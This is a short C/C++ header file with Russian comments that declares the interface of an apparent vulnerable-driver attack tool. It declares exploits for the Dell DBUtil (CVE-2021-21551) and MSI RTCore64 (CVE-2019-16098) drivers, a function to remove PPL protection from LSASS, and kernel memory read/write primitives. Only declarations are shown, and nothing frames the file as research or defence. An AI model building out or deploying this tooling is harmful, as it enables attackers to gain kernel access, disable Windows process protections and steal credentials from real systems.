#pragma once
#include <windows.h>
#include <tlhelp32.h>

struct VulnerableDriver {
    const char* name;
    const char* sysFileName;
    const BYTE* rawData;
    DWORD rawSize;
    const char* exploitFunction;
    DWORD serviceType;
};

bool LoadDriverViaService(const char* driverPath, const char* serviceName);
bool UnloadDriverService(const char* serviceName);
bool ExploitDellDBUtil_2_3();      // Полный CVE-2021-21551
bool ExploitMSIRTCore64();         // CVE-2019-16098
bool RemovePPLFromLSASS();         // Полное снятие PPL

// Примитивы для работы с ядром
ULONG_PTR ReadKernelMemory(ULONG_PTR address, SIZE_T size);
bool WriteKernelMemory(ULONG_PTR address, ULONG_PTR value, SIZE_T size);
ULONG_PTR FindEProcess(DWORD pid);
ULONG_PTR GetKernelBase();